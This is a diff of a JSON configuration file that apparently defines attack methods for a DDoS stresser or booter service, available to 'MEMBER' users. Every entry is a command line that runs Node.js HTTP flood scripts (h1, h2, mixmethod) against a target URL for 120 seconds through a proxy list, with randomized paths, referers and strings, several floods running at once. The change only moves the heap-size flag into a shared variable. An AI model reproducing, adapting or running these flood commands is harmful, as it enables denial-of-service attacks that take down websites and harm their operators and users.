@@ -1,18 +1,20 @@
 {
+    "HEAPSIZE": "node --max-old-space-size=65536",
+
     "httpmix": {
-        "command": "node --max-old-space-size=65536 h1 POST url live.txt 120 999 8 randomstring=true & node --max-old-space-size=65536 h2 -m POST -u url -t 2 -d false -p live.txt --full true --delay 1",
+        "command": "{HEAPSIZE} h2 -m POST -u url -s 120 -t 4 -r 8 -p live.txt -v 2 --full true --delay 1 -d false & {HEAPSIZE} mixmethod POST url 120 4 128 live.txt --query 1 --delay 1 --referer rand --http mix --close --randpath --parsed --reset --multipath 5 & {HEAPSIZE} h1 POST url live.txt 120 999 8 randomstring=true",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
     },
     "h1": {
-        "command": "node --max-old-space-size=65536 h1 POST url live.txt 120 999 8 randomstring=true",
+        "command": "{HEAPSIZE} h1 POST url live.txt 120 999 8 randomstring=true",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
     },
     "h2": {
-        "command": "node --max-old-space-size=65536 h2 -m POST -u url -s 120 -t 4 -r 8 -p live.txt -v 2 --full true --delay 1 -d false ",
+        "command": "{HEAPSIZE} h2 -m POST -u url -s 120 -t 4 -r 8 -p live.txt -v 2 --full true --delay 1 -d false",
         "url": "url",
         "time": 120,
         "visibility": "MEMBER"
